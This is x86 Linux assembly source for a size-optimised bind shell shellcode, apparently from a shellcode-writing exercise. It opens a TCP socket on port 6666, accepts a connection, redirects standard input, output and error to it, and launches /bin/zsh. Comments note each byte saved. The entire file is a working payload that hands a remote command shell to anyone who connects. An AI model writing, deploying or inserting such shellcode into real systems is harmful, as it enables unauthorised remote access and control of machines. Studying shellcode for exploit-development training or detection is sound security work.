




global _start

section .text

_start:	
        xor ebx, ebx
        push 0x66
	pop eax 		; sys_socketcall = 102 & saving one byte here insted of clearing and moving
        cdq			;EDX=0 saving one more byte here 

        ; 1 - create socket
        ; socket(AF_INET, SOCK_STREAM, 0);
        ; #define SYS_SOCKET      1               // sys_socket(2) 
        push ebx 		; null
        inc ebx 		; socketcall() socket = 1 & one byte has been saved here.
        push ebx 		; stack = 0, 1 & one byte size reduction
        push 0x2 		; stack = 0, 1, 2 (0, SOCK_STREAM, AF_INET)
        mov ecx, esp 		; mov stack ptr to ecx
        int 0x80 		; init

        ; 2 - Bind port
        ; bind(fd, (struct sockaddr *) &s_addr, 16);
        ; #define SYS_BIND        2               // sys_bind(2)

        pop ebx 		; sys_bind = 2
        pop esi  		; = 1
        push edx 		; stack = [0]
        push dword 0x0A1A0002 	; stack = [0, port_num]
        push byte 0x10 		; stack = [0, port_num, 2], 16
        push ecx 		; stack = [0, port_num, 2], 16, pointer
        push eax 		; stack = [0, port_num, 2], 16, *ptr, fd
        mov ecx, esp 		; move stack ptr to ecx
	mov al,0x66 		; sys_socketcall = 102

        int 0x80 		; init

        ; 3 - Listen
        ; listen(fd, 1);
        ; #define SYS_LISTEN      4               // sys_listen(2) 
	mov [ecx+4],eax
        mov al, 0x66 ; sys_socketcall = 102
        mov bl, 0x4 ; reduction by one byte insted of adding 0x2
        int 0x80 ; init

        ; 4 - Accept
        ; accept(fd, NULL, NULL);
        ; #define SYS_ACCEPT      5               // sys_accept(2) 
	;alot of instructions has been removed sice the same functionality will be getten
        mov al, 0x66 ; sys_socketcall = 102
        inc ebx ; make 5 for listen (4 from listen)
       	int 0x80 ; init

        ; 5 - dup
        ; sys_dup2 = 63 = 0x3f

        xchg eax, ebx   ; ebx = fd / eax = 5
        pop ecx    	; insted of NULL ecx by xor we will pop 0x3 and then-
			; we will decreament this will save us three bytes
        dec ecx		; and here ecx should equal to two

        dup2: ; STDIN, STDOUT, STDERR
                mov al, 0x3f    ; sys_dup2
                int 0x80        ; init
                dec cl          ; decrement counter
                jns dup2        ; Jump on No Sign (Positive)

        ; 6 - execve /bin/zsh
        ; normal execve shell exec

        push eax
        push 0x68737a2f ; hsz/
        push 0x6e69622f ; nib/

        mov ebx, esp

       push eax
       ;mov edx, esp the following instruction has been removed inorder to save
	;		two more bytes

        push ebx
        mov ecx, esp

        mov al, 0xb     ; sys_execve (11)
        int 0x80        ; init
